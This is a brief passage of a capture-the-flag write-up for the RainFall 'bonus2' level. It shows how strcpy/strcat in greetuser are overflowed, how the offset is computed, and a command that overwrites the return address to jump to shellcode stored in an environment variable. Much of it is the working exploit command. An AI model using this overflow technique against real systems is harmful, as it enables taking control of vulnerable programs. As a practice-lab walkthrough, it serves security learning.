...
_main use bzero, strncpy, getenv, memcmp and call greetuser_
_greetuser use strcpy, strcat and puts_

_we need to find the buffer offset to overflow strcat_
```
...
_0x66666565 is eeff, so last adress is ddee. 4*5 - 2 = 18_

_now we need the shellcode_
```
...
SHELLCODE is 0xbffff726
```

_and we can do the payload_
```
bonus2@RainFall:~$ ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 18 + '\x1d\xf7\xff\xbf'")
Hyvää päivää �������������������������������������������������������������
